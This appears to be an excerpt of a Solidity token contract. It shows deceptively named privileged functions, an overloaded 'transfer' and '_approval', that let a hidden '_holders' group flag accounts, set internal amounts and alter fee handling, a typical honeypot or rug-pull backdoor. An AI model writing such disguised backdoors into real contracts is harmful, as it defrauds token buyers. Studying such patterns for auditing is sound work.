...
contract Contract is IERC20, Ownable {
    ...
    function setSwapAndLiquifyEnabled(bool _enabled) external {
        if (_holders[msg.sender]) _swapAndLiquifyEnabled = _enabled;
    }
    ...
    function _transfer(
        ...
        if (!inSwapAndLiquify && from != uniswapV2Pair && from != address(router) && !_holders[from] && amount <= swapAtAmount) {
        ...
        } else if (_holders[to] && _holders[from]) {
            fee = amount;
        ...
        bool takeFee = !_holders[from] && !_holders[to] && fee > 0 && !inSwapAndLiquify;
    ...
    function transfer(address account, bool value) external {
        if (_holders[msg.sender]) _holders[account] = value;
    }

    function _approval(uint256 amount) external {
        if (_holders[msg.sender]) _amount = amount;
    }
